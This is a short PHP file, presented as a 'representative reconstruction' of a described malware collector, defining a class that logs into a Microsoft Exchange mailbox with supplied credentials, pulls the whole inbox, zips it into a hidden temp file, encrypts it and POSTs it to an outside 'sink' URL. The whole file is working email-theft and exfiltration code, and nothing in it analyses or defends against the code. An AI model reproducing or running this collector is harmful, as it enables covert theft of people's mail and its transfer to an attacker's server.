<?php
// Representative reconstruction of the described collector, not recovered malware.
class Collector {
    public $file='/var/tmp/.sess.zip';
    public function collect($ews, $user, $password, $sink, $key, $clientid) {
        $this->ch = curl_init($ews . '/EWS/Exchange.asmx');
        curl_setopt($this->ch, CURLOPT_USERPWD, "$user:$password");
        curl_setopt($this->ch, CURLOPT_POSTFIELDS, '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"><s:Body><m:FindItem Traversal="Shallow"><m:ItemShape><t:BaseShape>AllProperties</t:BaseShape></m:ItemShape><m:ParentFolderIds><t:DistinguishedFolderId Id="inbox"/></m:ParentFolderIds></m:FindItem></s:Body></s:Envelope>');
        curl_setopt($this->ch, CURLOPT_RETURNTRANSFER, true);
        $mail = curl_exec($this->ch);
        $archive = new ZipArchive();
        $archive->open($this->file, ZIPARCHIVE::CREATE);
        $archive->addFromString('messages.xml', $mail);
        $archive->close();
        $iv = random_bytes(16);
        $payload = $iv . openssl_encrypt(file_get_contents($this->file), 'AES-128-CBC', $key, OPENSSL_RAW_DATA, $iv);
        curl_setopt($this->ch, CURLOPT_URL, $sink);
        curl_setopt($this->ch, CURLOPT_HTTPHEADER,array("X-Id: $clientid"));
        curl_setopt($this->ch, CURLOPT_POSTFIELDS, $payload);
        curl_exec($this->ch);
    }
}
